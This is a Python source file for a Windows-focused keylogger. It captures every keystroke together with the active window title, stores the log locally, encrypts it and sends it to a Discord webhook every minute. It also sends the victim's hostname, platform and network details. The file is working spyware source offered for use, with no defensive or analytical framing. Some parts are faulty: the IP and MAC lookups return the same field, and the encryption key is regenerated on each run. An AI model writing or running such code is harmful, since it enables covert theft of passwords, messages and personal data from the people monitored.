import os
import logging
import requests
import platform
import psutil
from pynput.keyboard import Listener
from datetime import datetime
from threading import Timer
import getpass
import base64
from cryptography.fernet import Fernet
import win32gui  # Windows only for active window tracking

# Discord webhook URL (replace with your own webhook URL)
WEBHOOK_URL = "https://discord.com/api/webhooks/XXXXXXXXX/XXXXXXXXX"

# Generate a key for encryption
# (For real-world usage, store the key securely; don't hardcode)
ENCRYPTION_KEY = Fernet.generate_key()
cipher_suite = Fernet(ENCRYPTION_KEY)

# Set up logging to save to a file
log_dir = os.path.expanduser("~") + "/keylogs/"
if not os.path.exists(log_dir):
    os.makedirs(log_dir)

log_file = log_dir + "key_log.txt"
encrypted_log_file = log_dir + "encrypted_key_log.txt"
logging.basicConfig(filename=log_file, level=logging.DEBUG, format="%(asctime)s: %(message)s")

# Function to log keystrokes with active window info
def log_keystrokes(key):
    try:
        active_window = win32gui.GetWindowText(win32gui.GetForegroundWindow())
        logging.info(f"[Window: {active_window}] {str(key).replace("'", '')}")
    except Exception as e:
        logging.error(f"Error logging keystroke: {e}")

# Function to encrypt the log file
def encrypt_logs():
    try:
        with open(log_file, 'rb') as f:
            file_data = f.read()
        encrypted_data = cipher_suite.encrypt(file_data)

        with open(encrypted_log_file, 'wb') as f:
            f.write(encrypted_data)
    except Exception as e:
        logging.error(f"Error encrypting log file: {e}")

# Function to capture system info
def get_system_info():
    try:
        info = {
            "platform": platform.system(),
            "platform-release": platform.release(),
            "platform-version": platform.version(),
            "architecture": platform.machine(),
            "hostname": platform.node(),
            "ip-address": get_ip_address(),
            "mac-address": get_mac_address(),
            "processor": platform.processor(),
            "ram": str(round(psutil.virtual_memory().total / (1024.0 ** 3))) + " GB"
        }
        return info
    except Exception as e:
        logging.error(f"Error retrieving system info: {e}")
        return {}

# Cross-platform IP and MAC address retrieval
def get_ip_address():
    try:
        if platform.system() == "Windows":
            return psutil.net_if_addrs()['Wi-Fi'][1].address
        else:
            return psutil.net_if_addrs()['en0'][0].address  # For Mac/Linux
    except Exception as e:
        logging.error(f"Error retrieving IP address: {e}")
        return "Unknown"

def get_mac_address():
    try:
        if platform.system() == "Windows":
            return psutil.net_if_addrs()['Wi-Fi'][1].address
        else:
            return psutil.net_if_addrs()['en0'][0].address  # For Mac/Linux
    except Exception as e:
        logging.error(f"Error retrieving MAC address: {e}")
        return "Unknown"

# Function to send logs to Discord
def send_to_discord():
    try:
        # Encrypt logs before sending
        encrypt_logs()
        with open(encrypted_log_file, 'rb') as f:
            content = f.read()

        if content:
            payload = {
                "content": f"```\n{base64.b64encode(content).decode()}\n```",  # Sending encrypted logs
            }
            response = requests.post(WEBHOOK_URL, json=payload)
            if response.status_code == 204:
                print("Logs sent to Discord")
            else:
                print(f"Failed to send logs, status code: {response.status_code}")
        
        # Clear the log file after sending
        open(log_file, "w").close()
    except Exception as e:
        logging.error(f"Error sending logs: {e}")

# Function to send system info to Discord
def send_system_info():
    try:
        info = get_system_info()
        payload = {
            "content": f"System Info:\n```{info}```"
        }
        requests.post(WEBHOOK_URL, json=payload)
    except Exception as e:
        logging.error(f"Error sending system info: {e}")

# Schedule periodic reports to Discord
def schedule_report(interval):
    Timer(interval, schedule_report, [interval]).start()  # Repeat every `interval` seconds
    send_to_discord()

# Main function to run keylogger and send periodic updates
def main():
    send_system_info()  # Send system info at the beginning
    schedule_report(60)  # Send log reports to Discord every 60 seconds (can be adjusted)

    # Start the keylogger listener
    with Listener(on_press=log_keystrokes) as listener:
        listener.join()

if __name__ == "__main__":
    main()
